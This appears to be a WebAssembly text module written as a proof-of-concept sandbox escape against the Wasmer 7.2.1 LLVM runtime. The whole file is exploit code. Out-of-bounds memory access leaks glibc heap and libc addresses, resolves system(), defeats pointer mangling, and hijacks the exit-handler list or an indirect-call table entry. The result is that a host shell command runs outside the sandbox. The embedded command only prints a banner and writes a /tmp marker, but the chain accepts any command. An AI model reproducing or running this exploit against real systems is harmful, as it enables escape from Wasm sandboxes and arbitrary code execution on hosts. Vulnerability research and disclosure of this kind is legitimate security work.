(module
  ;; Standalone Wasmer 7.2.1 LLVM CLI proof for x86-64 glibc containers.
  ;; The only side effect is a terminal banner and /tmp/wasmer-exploit-success.
  (memory (export "memory") 1 1)
  (type $void (func))
  (table (export "__indirect_function_table") 1 funcref)
  (elem (i32.const 0) $dummy)
  (data (i32.const 4096)
    "printf '\0a\1b[1;35m*** WASM -> NATIVE HOST CODE ***\1b[0m\0a\0a'; printf 'Wasmer LLVM sandbox escape confirmed\0a' > /tmp/wasmer-exploit-success\00")

  ;; LLVM adds this memory32 index to the 0xffffffff immediate in i64. The
  ;; resulting host offset may lie between 4 and almost 8 GiB.
  (func $oob_load8 (param $delta i64) (result i32)
    local.get $delta
    i64.const 4294967295
    i64.sub
    i32.wrap_i64
    i32.load8_u offset=4294967295 align=1)

  (func $oob_load32 (param $delta i64) (result i32)
    local.get $delta
    i64.const 4294967295
    i64.sub
    i32.wrap_i64
    i32.load offset=4294967295 align=1)

  (func $oob_load64 (param $delta i64) (result i64)
    local.get $delta
    i64.const 4294967295
    i64.sub
    i32.wrap_i64
    i64.load offset=4294967295 align=1)

  (func $oob_store8 (param $delta i64) (param $value i32)
    local.get $delta
    i64.const 4294967295
    i64.sub
    i32.wrap_i64
    local.get $value
    i32.store8 offset=4294967295 align=1)

  (func $oob_store64 (param $delta i64) (param $value i64)
    local.get $delta
    i64.const 4294967295
    i64.sub
    i32.wrap_i64
    local.get $value
    i64.store offset=4294967295 align=1)

  ;; The first mapping after the six-GiB static-memory reservation is a glibc
  ;; secondary malloc heap in the normal CLI process. heap_info.ar_ptr leaks an
  ;; absolute pointer and therefore the linear-memory base. Following
  ;; malloc_state.next reaches main_arena inside libc.
  (func $find_libc (result i64 i64) ;; libc absolute base, linear absolute base
    (local $linear_base i64)
    (local $arena i64)
    (local $next i64)
    (local $next_offset i64)
    (local $scan_offset i64)
    (local $candidate i64)
    (local $page_delta i64)

    i64.const 6442450944 ;; 0x180000000
    call $oob_load64
    local.tee $arena
    i64.const 6442450992 ;; 0x180000030
    i64.sub
    local.set $linear_base

    ;; malloc_state grew between nearby glibc releases. Find its `next` field
    ;; by locating the first different secondary-arena pointer near the end of
    ;; the bin array (0x818 on glibc 2.43, 0x870 on glibc 2.39).
    i64.const 2048
    local.set $scan_offset
    block $found_next_offset
      loop $scan_malloc_state
        local.get $arena
        local.get $scan_offset
        i64.add
        local.get $linear_base
        i64.sub
        call $oob_load64
        local.tee $candidate
        local.get $arena
        i64.ne
        local.get $candidate
        i64.const 67108863
        i64.and
        i64.const 48
        i64.eq
        i32.and
        if
          local.get $scan_offset
          local.set $next_offset
          br $found_next_offset
        end
        local.get $scan_offset
        i64.const 8
        i64.add
        local.tee $scan_offset
        i64.const 2560
        i64.lt_u
        br_if $scan_malloc_state
        unreachable
      end
    end

    loop $arenas
      local.get $arena
      local.get $next_offset
      i64.add
      local.get $linear_base
      i64.sub
      call $oob_load64
      local.tee $next
      i64.const 67108863 ;; secondary arenas are segment+0x30 in 64-MiB heaps
      i64.and
      i64.const 48
      i64.eq
      if
        local.get $next
        local.set $arena
        br $arenas
      end
    end

    ;; main_arena is in libc's final writable mapping. All libc LOAD mappings
    ;; are contiguous, so scan mapped page starts backward to the ELF header.
    local.get $next
    local.get $linear_base
    i64.sub
    i64.const 1572864 ;; jump below RELRO guard pages near libc's writable end
    i64.sub
    i64.const -4096
    i64.and
    local.set $page_delta
    loop $elf
      local.get $page_delta
      call $oob_load32
      i32.const 1179403647 ;; little-endian 0x7f,'E','L','F'
      i32.eq
      if
        local.get $linear_base
        local.get $page_delta
        i64.add
        local.get $linear_base
        return
      end
      local.get $page_delta
      i64.const 4096
      i64.sub
      local.set $page_delta
      br $elf
    end
    unreachable)

  (export "find_libc" (func $find_libc))

  ;; Resolve the exported libc symbol "system" from the in-memory ELF dynamic
  ;; symbol table rather than pinning its offset to one glibc build.
  (func $resolve_system (param $libc_base i64) (param $linear_base i64) (result i64)
    (local $libc_delta i64)
    (local $phoff i64)
    (local $phentsize i64)
    (local $phnum i64)
    (local $i i64)
    (local $ph i64)
    (local $dynamic i64)
    (local $cursor i64)
    (local $tag i64)
    (local $value i64)
    (local $strtab i64)
    (local $symtab i64)
    (local $hashtab i64)
    (local $nchain i64)
    (local $sym i64)
    (local $name i64)

    local.get $libc_base
    local.get $linear_base
    i64.sub
    local.set $libc_delta

    local.get $libc_delta
    i64.const 32
    i64.add
    call $oob_load64
    local.set $phoff
    local.get $libc_delta
    i64.const 54
    i64.add
    call $oob_load32
    i64.extend_i32_u
    i64.const 65535
    i64.and
    local.set $phentsize
    local.get $libc_delta
    i64.const 56
    i64.add
    call $oob_load32
    i64.extend_i32_u
    i64.const 65535
    i64.and
    local.set $phnum

    loop $program_headers
      local.get $i
      local.get $phnum
      i64.lt_u
      if
        local.get $libc_delta
        local.get $phoff
        i64.add
        local.get $i
        local.get $phentsize
        i64.mul
        i64.add
        local.tee $ph
        call $oob_load32
        i32.const 2 ;; PT_DYNAMIC
        i32.eq
        if
          local.get $libc_delta
          local.get $ph
          i64.const 16
          i64.add
          call $oob_load64 ;; p_vaddr
          i64.add
          local.set $dynamic
        end
        local.get $i
        i64.const 1
        i64.add
        local.set $i
        br $program_headers
      end
    end

    local.get $dynamic
    local.set $cursor
    loop $dynamic_tags
      local.get $cursor
      call $oob_load64
      local.tee $tag
      i64.eqz
      if
      else
        local.get $cursor
        i64.const 8
        i64.add
        call $oob_load64
        local.set $value
        local.get $tag
        i64.const 4
        i64.eq
        if
          local.get $value
          local.get $linear_base
          i64.sub
          local.set $hashtab
        end
        local.get $tag
        i64.const 5
        i64.eq
        if
          local.get $value
          local.get $linear_base
          i64.sub
          local.set $strtab
        end
        local.get $tag
        i64.const 6
        i64.eq
        if
          local.get $value
          local.get $linear_base
          i64.sub
          local.set $symtab
        end
        local.get $cursor
        i64.const 16
        i64.add
        local.set $cursor
        br $dynamic_tags
      end
    end

    local.get $hashtab
    i64.const 4
    i64.add
    call $oob_load32
    i64.extend_i32_u
    local.set $nchain
    i64.const 0
    local.set $i
    loop $symbols
      local.get $i
      local.get $nchain
      i64.lt_u
      if
        local.get $symtab
        local.get $i
        i64.const 24
        i64.mul
        i64.add
        local.tee $sym
        call $oob_load32
        i64.extend_i32_u
        local.get $strtab
        i64.add
        local.tee $name
        call $oob_load64
        i64.const 72057594037927935 ;; low seven bytes
        i64.and
        i64.const 120282512849267 ;; little-endian "system\0"
        i64.eq
        if
          local.get $libc_base
          local.get $sym
          i64.const 8
          i64.add
          call $oob_load64
          i64.add
          return
        end
        local.get $i
        i64.const 1
        i64.add
        local.set $i
        br $symbols
      end
    end
    unreachable)

  ;; Locate glibc's static initial exit-function list without a glibc-version
  ;; offset. It is a distinctive full 32-entry list in libc's writable PT_LOAD.
  ;; A run of entries sharing the release CLI's __dso_handle identifies the
  ;; first Wasmer destructor and recovers the pointer guard.
  (func $find_initial (param $libc_base i64) (param $linear_base i64)
    (result i64 i64 i64) ;; initial absolute, PIE base, pointer guard
    (local $libc_delta i64)
    (local $phoff i64)
    (local $phentsize i64)
    (local $phnum i64)
    (local $i i64)
    (local $ph i64)
    (local $rw_start i64)
    (local $rw_end i64)
    (local $candidate i64)
    (local $j i64)
    (local $dso i64)
    (local $pie i64)
    (local $guard i64)

    local.get $libc_base
    local.get $linear_base
    i64.sub
    local.set $libc_delta
    local.get $libc_delta
    i64.const 32
    i64.add
    call $oob_load64
    local.set $phoff
    local.get $libc_delta
    i64.const 54
    i64.add
    call $oob_load32
    i64.extend_i32_u
    i64.const 65535
    i64.and
    local.set $phentsize
    local.get $libc_delta
    i64.const 56
    i64.add
    call $oob_load32
    i64.extend_i32_u
    i64.const 65535
    i64.and
    local.set $phnum

    loop $load_segments
      local.get $i
      local.get $phnum
      i64.lt_u
      if
        local.get $libc_delta
        local.get $phoff
        i64.add
        local.get $i
        local.get $phentsize
        i64.mul
        i64.add
        local.tee $ph
        call $oob_load32
        i32.const 1 ;; PT_LOAD
        i32.eq
        local.get $ph
        i64.const 4
        i64.add
        call $oob_load32
        i32.const 2 ;; PF_W
        i32.and
        i32.eqz
        i32.eqz
        i32.and
        if
          local.get $libc_delta
          local.get $ph
          i64.const 16
          i64.add
          call $oob_load64
          i64.add
          local.tee $rw_start
          local.get $ph
          i64.const 40
          i64.add
          call $oob_load64 ;; p_memsz
          i64.add
          local.set $rw_end
        end
        local.get $i
        i64.const 1
        i64.add
        local.set $i
        br $load_segments
      end
    end

    local.get $rw_start
    local.set $candidate
    loop $exit_lists
      local.get $candidate
      i64.const 1040
      i64.add
      local.get $rw_end
      i64.le_u
      if
        local.get $candidate
        i64.const 8
        i64.add
        call $oob_load64
        i64.const 32
        i64.eq
        local.get $candidate
        i64.const 16
        i64.add
        call $oob_load64
        i64.const 4
        i64.eq
        i32.and
        local.get $candidate
        i64.const 48
        i64.add
        call $oob_load64
        i64.const 4
        i64.eq
        i32.and
        local.get $candidate
        i64.const 1008
        i64.add
        call $oob_load64
        i64.const 4
        i64.eq
        i32.and
        if
          i64.const 0
          local.set $j
          loop $destructors
            local.get $j
            i64.const 28
            i64.lt_u
            if
              local.get $candidate
              i64.const 40
              i64.add
              local.get $j
              i64.const 32
              i64.mul
              i64.add
              call $oob_load64
              local.tee $dso
              i64.eqz
              i32.eqz
              local.get $candidate
              i64.const 72
              i64.add
              local.get $j
              i64.const 32
              i64.mul
              i64.add
              call $oob_load64
              local.get $dso
              i64.eq
              i32.and
              local.get $candidate
              i64.const 104
              i64.add
              local.get $j
              i64.const 32
              i64.mul
              i64.add
              call $oob_load64
              local.get $dso
              i64.eq
              i32.and
              if
                local.get $dso
                i64.const 175075328 ;; release CLI __dso_handle
                i64.sub
                local.set $pie
                local.get $candidate
                i64.const 24
                i64.add
                local.get $j
                i64.const 32
                i64.mul
                i64.add
                call $oob_load64
                i64.const 17
                i64.rotr
                local.get $pie
                i64.const 67451200 ;; first CLI destructor
                i64.add
                i64.xor
                local.set $guard

                ;; Verify against the next known release-CLI destructor.
                local.get $candidate
                i64.const 56
                i64.add
                local.get $j
                i64.const 32
                i64.mul
                i64.add
                call $oob_load64
                i64.const 17
                i64.rotr
                local.get $guard
                i64.xor
                local.get $pie
                i64.const 67682800
                i64.add
                i64.eq
                if
                  local.get $linear_base
                  local.get $candidate
                  i64.add
                  local.get $pie
                  local.get $guard
                  return
                end
              end
              local.get $j
              i64.const 1
              i64.add
              local.set $j
              br $destructors
            end
          end
        end
        local.get $candidate
        i64.const 8
        i64.add
        local.set $candidate
        br $exit_lists
      end
    end
    unreachable)

  (func $dummy (type $void) nop)

  (func (export "hold") (loop $hold_loop br $hold_loop))

  (func (export "run")
    (local $libc_base i64)
    (local $linear_base i64)
    (local $libc_delta i64)
    (local $system i64)
    (local $initial_abs i64)
    (local $initial_delta i64)
    (local $pie_base i64)
    (local $guard i64)
    (local $mangled_system i64)
    (local $i i32)

    call $find_libc
    local.set $linear_base
    local.set $libc_base
    local.get $libc_base
    local.get $linear_base
    i64.sub
    local.set $libc_delta
    local.get $libc_base
    local.get $linear_base
    call $resolve_system
    local.set $system

    local.get $libc_base
    local.get $linear_base
    call $find_initial
    local.set $guard
    local.set $pie_base
    local.set $initial_abs
    local.get $initial_abs
    local.get $linear_base
    i64.sub
    local.set $initial_delta

    local.get $system
    local.get $guard
    i64.xor
    i64.const 17
    i64.rotl
    local.set $mangled_system

    ;; Copy the persistent command into unused tail space in libc's initial
    ;; exit list. Guest memory itself will be unmapped during CLI teardown.
    loop $copy_command
      local.get $initial_delta
      i64.const 768
      i64.add
      local.get $i
      i64.extend_i32_u
      i64.add
      i32.const 4096
      local.get $i
      i32.add
      i32.load8_u
      call $oob_store8
      local.get $i
      i32.const 1
      i32.add
      local.tee $i
      i32.const 134
      i32.lt_u
      br_if $copy_command
    end

    ;; Replace the static exit list with one ef_cxa entry calling system(cmd).
    local.get $initial_delta
    i64.const 0
    call $oob_store64 ;; next
    local.get $initial_delta
    i64.const 8
    i64.add
    i64.const 1
    call $oob_store64 ;; idx
    local.get $initial_delta
    i64.const 16
    i64.add
    i64.const 4
    call $oob_store64 ;; ef_cxa
    local.get $initial_delta
    i64.const 24
    i64.add
    local.get $mangled_system
    call $oob_store64
    local.get $initial_delta
    i64.const 32
    i64.add
    local.get $initial_abs
    i64.const 768
    i64.add
    call $oob_store64
    local.get $initial_delta
    i64.const 40
    i64.add
    i64.const 0
    call $oob_store64

    ;; The static list remains the tail of glibc's linked exit-handler lists.
    ;; The guest returns normally; libc reaches it during ordinary process exit.
    )

  ;; Manifest/WASI-runner path. Grow a distinctive funcref table, locate
  ;; its backing allocation in reachable arenas, and replace one element with
  ;; a guest-resident anyfunc record that calls libc system().
  (func (export "_start") (export "package_run")
    (local $arena i64)
    (local $next i64)
    (local $next_offset i64)
    (local $scan_offset i64)
    (local $candidate i64)
    (local $linear i64)
    (local $heap_delta i64)
    (local $heap_size i64)
    (local $scan i64)
    (local $value i64)
    (local $table_delta i64)
    (local $anyfunc_abs i64)
    (local $anyfunc_delta i64)
    (local $dummy_func i64)
    (local $signature i64)
    (local $trampoline i64)
    (local $libc_anchor i64)
    (local $anchor_offset i64)
    (local $system_offset i64)
    (local $low i64)
    (local $system i64)
    (local $fallback i32)
    (local $verify i64)
    (local $valid i32)

    ;; Force a 32-KiB table allocation during guest execution and fill it with
    ;; one repeated, valid VMFuncRef pointer.
    ref.func $dummy
    i32.const 4095
    table.grow
    drop
    i32.const 0
    ref.func $dummy
    i32.const 4096
    table.fill

    i64.const 6442450944
    call $oob_load64
    local.tee $arena
    i64.const 6442450992
    i64.sub
    local.set $linear

    ;; Discover malloc_state.next from a different secondary arena.
    i64.const 2048
    local.set $scan_offset
    block $found_next
      loop $scan_state
        local.get $arena
        local.get $linear
        i64.sub
        local.get $scan_offset
        i64.add
        call $oob_load64
        local.tee $candidate
        local.get $arena
        i64.ne
        local.get $candidate
        i64.const 67108863
        i64.and
        i64.const 48
        i64.eq
        i32.and
        if
          local.get $scan_offset
          local.set $next_offset
          br $found_next
        end
        local.get $scan_offset
        i64.const 8
        i64.add
        local.tee $scan_offset
        i64.const 2560
        i64.lt_u
        br_if $scan_state
        unreachable
      end
    end

    block $table_found
      loop $arena_loop
        local.get $arena
        local.get $linear
        i64.sub
        i64.const 8589934592
        i64.ge_u
        if
          br $table_found
        end

        local.get $arena
        i64.const -67108864
        i64.and
        local.get $linear
        i64.sub
        local.set $heap_delta
        local.get $heap_delta
        i64.const 24
        i64.add
        call $oob_load64
        local.set $heap_size
        i64.const 0
        local.set $scan

        block $heap_done
          loop $scan_heap
            local.get $scan
            i64.const 32768
            i64.add
            local.get $heap_size
            i64.gt_u
            br_if $heap_done

            local.get $heap_delta
            local.get $scan
            i64.add
            call $oob_load64
            local.set $value

            ;; The first, second, sixteenth, and final entries must match,
            ;; uniquely identifying the complete 4096-entry table fill.
            local.get $value
            local.get $linear
            i64.const 6442450944
            i64.add
            i64.ge_u
            local.get $value
            local.get $linear
            i64.const 8589934592
            i64.add
            i64.lt_u
            i32.and
            if
              local.get $heap_delta
              local.get $scan
              i64.add
              i64.const 8
              i64.add
              call $oob_load64
              local.get $value
              i64.eq
              if
                local.get $heap_delta
                local.get $scan
                i64.add
                i64.const 120
                i64.add
                call $oob_load64
                local.get $value
                i64.eq
                if
                  local.get $heap_delta
                  local.get $scan
                  i64.add
                  i64.const 32760
                  i64.add
                  call $oob_load64
                  local.get $value
                  i64.eq
                  if
                    ;; Sample every 512 bytes across the allocation so sparse
                    ;; metadata arrays cannot masquerade as the live table.
                    i64.const 0
                    local.set $verify
                    i32.const 1
                    local.set $valid
                    block $verify_done
                      loop $verify_table
                        local.get $heap_delta
                        local.get $scan
                        i64.add
                        local.get $verify
                        i64.add
                        call $oob_load64
                        local.get $value
                        i64.ne
                        if
                          i32.const 0
                          local.set $valid
                          br $verify_done
                        end
                        local.get $verify
                        i64.const 512
                        i64.add
                        local.tee $verify
                        i64.const 32768
                        i64.lt_u
                        br_if $verify_table
                      end
                    end
                    local.get $valid
                    if
                      local.get $heap_delta
                      local.get $scan
                      i64.add
                      local.set $table_delta
                      local.get $value
                      local.set $anyfunc_abs
                      br $table_found
                    end
                  end
                end
              end
            end

            local.get $scan
            i64.const 8
            i64.add
            local.set $scan
            br $scan_heap
          end
        end

        ;; Continue through the real arena list while it stays reachable.
        local.get $arena
        local.get $linear
        i64.sub
        local.get $next_offset
        i64.add
        call $oob_load64
        local.tee $next
        i64.const 67108863
        i64.and
        i64.const 48
        i64.eq
        if
          local.get $next
          local.get $linear
          i64.sub
          i64.const 8589934592
          i64.lt_u
          if
            local.get $next
            local.set $arena
            br $arena_loop
          end
        end

        ;; Exited compiler arenas may be absent from glibc's active list. The
        ;; adjacent 0x184 heap is the only observed warm-layout fallback and is
        ;; probed only after every linked reachable arena has been exhausted.
        local.get $fallback
        i32.eqz
        if
          i32.const 1
          local.set $fallback
          local.get $linear
          i64.const 6509559856 ;; 0x184000030
          i64.add
          local.set $arena
          br $arena_loop
        end
      end
    end

    local.get $table_delta
    i64.eqz
    if unreachable end

    ;; The repeated pointer names dummy's real anyfunc record. Copy the fields
    ;; needed by LLVM call_indirect into a fake record in guest memory.
    local.get $anyfunc_abs
    local.get $linear
    i64.sub
    local.tee $anyfunc_delta
    call $oob_load64
    local.set $dummy_func
    local.get $anyfunc_delta
    i64.const 8
    i64.add
    call $oob_load64
    local.set $signature
    local.get $anyfunc_delta
    i64.const 24
    i64.add
    call $oob_load64
    local.set $trampoline

    ;; Cold LLVM compilation leaves a stable four-pointer libc cluster at
    ;; heap+0x1b28. Validate its relative offsets before using libc+0x64fe8.
    local.get $heap_delta
    i64.const 6952 ;; 0x1b28
    i64.add
    call $oob_load64
    local.set $candidate
    local.get $heap_delta
    i64.const 6976 ;; 0x1b40
    i64.add
    call $oob_load64
    local.get $candidate
    i64.sub
    i64.const 1537838 ;; 0x17772e
    i64.eq
    local.get $heap_delta
    i64.const 7000 ;; 0x1b58
    i64.add
    call $oob_load64
    local.get $candidate
    i64.sub
    i64.const 37012 ;; 0x9094
    i64.eq
    i32.and
    local.get $candidate
    i64.const 4095
    i64.and
    i64.const 4072 ;; 0xfe8
    i64.eq
    i32.and
    if
      local.get $candidate
      local.set $libc_anchor
      i64.const 413672 ;; 0x64fe8
      local.set $anchor_offset
      i64.const 378208 ;; system at 0x5c560
      local.set $system_offset
    end

    ;; glibc 2.39 has an analogous cluster shifted to heap+0x1b58.
    local.get $libc_anchor
    i64.eqz
    if
      local.get $heap_delta
      i64.const 7000 ;; 0x1b58
      i64.add
      call $oob_load64
      local.set $candidate
      local.get $heap_delta
      i64.const 7016 ;; 0x1b68
      i64.add
      call $oob_load64
      local.get $candidate
      i64.sub
      i64.const 1488417 ;; 0x16b621
      i64.eq
      local.get $heap_delta
      i64.const 7048 ;; 0x1b88
      i64.add
      call $oob_load64
      local.get $candidate
      i64.sub
      i64.const 34556 ;; 0x86fc
      i64.eq
      i32.and
      local.get $candidate
      i64.const 4095
      i64.and
      i64.const 3464 ;; 0xd88
      i64.eq
      i32.and
      if
        local.get $candidate
        local.set $libc_anchor
        i64.const 396680 ;; 0x60d88
        local.set $anchor_offset
        i64.const 362320 ;; system at 0x58750
        local.set $system_offset
      end
    end

    ;; Otherwise recognize stable saved PCs used by the three validated glibc
    ;; releases: 2.43, 2.39, and 2.35.
    local.get $libc_anchor
    i64.eqz
    if
      i64.const 0
      local.set $scan
      block $anchor_found
        loop $scan_anchor
          local.get $scan
          i64.const 8
          i64.add
          local.get $heap_size
          i64.gt_u
          br_if $anchor_found
          local.get $heap_delta
          local.get $scan
          i64.add
          call $oob_load64
          local.tee $candidate
          local.get $linear
          i64.const 8589934592
          i64.add
          i64.gt_u
          local.get $candidate
          local.get $linear
          i64.const 12884901888
          i64.add
          i64.lt_u
          i32.and
          local.get $candidate
          local.get $dummy_func
          i64.gt_u
          i32.and
          local.get $candidate
          local.get $dummy_func
          i64.sub
          i64.const 1048576
          i64.gt_u
          i32.and
          if
            local.get $candidate
            i64.const 4095
            i64.and
            local.tee $low
            i64.const 399 ;; glibc 2.43: 0x4818f
            i64.eq
            local.get $low
            i64.const 1697 ;; glibc 2.39: 0x476a1
            i64.eq
            i32.or
            local.get $low
            i64.const 1906 ;; glibc 2.35 cold: 0x3f772
            i64.eq
            i32.or
            local.get $low
            i64.const 1107 ;; glibc 2.35 warm: 0xa5453
            i64.eq
            i32.or
            if
              ;; 0x3f772 also occurs in an unmapped Wasmer sentinel. Keep it
              ;; only as a fallback while continuing to search for a stronger
              ;; glibc-version discriminator later in the heap.
              local.get $low
              i64.const 1906
              i64.eq
              if
                local.get $candidate
                local.set $libc_anchor
                i64.const 259954
                local.set $anchor_offset
                i64.const 331120
                local.set $system_offset
              else
                local.get $candidate
                local.set $libc_anchor
                local.get $low
                i64.const 399
                i64.eq
                if
                  i64.const 295311
                  local.set $anchor_offset
                  i64.const 378208
                  local.set $system_offset
                else
                  local.get $low
                  i64.const 1697
                  i64.eq
                  if
                    i64.const 292513
                    local.set $anchor_offset
                    i64.const 362320
                    local.set $system_offset
                  else
                    i64.const 676947
                    local.set $anchor_offset
                    i64.const 331120
                    local.set $system_offset
                  end
                end
                br $anchor_found
              end
            end
          end
          local.get $scan
          i64.const 8
          i64.add
          local.set $scan
          br $scan_anchor
        end
      end
    end
    local.get $libc_anchor
    i64.eqz
    if unreachable end

    local.get $libc_anchor
    local.get $anchor_offset
    i64.sub
    local.get $system_offset
    i64.add
    local.set $system

    ;; Fake VMCallerCheckedAnyfunc at guest offset 2048.
    i32.const 2048
    local.get $system
    i64.store
    i32.const 2056
    local.get $signature
    i64.store
    i32.const 2064
    local.get $linear
    i64.const 4096
    i64.add
    i64.store
    i32.const 2072
    local.get $trampoline
    i64.store

    ;; Redirect table[0] to the fake record; call_indirect supplies its vmctx
    ;; as native RDI, yielding system(linear+4096).
    local.get $table_delta
    local.get $linear
    i64.const 2048
    i64.add
    call $oob_store64
    i32.const 0
    call_indirect (type $void))
  )
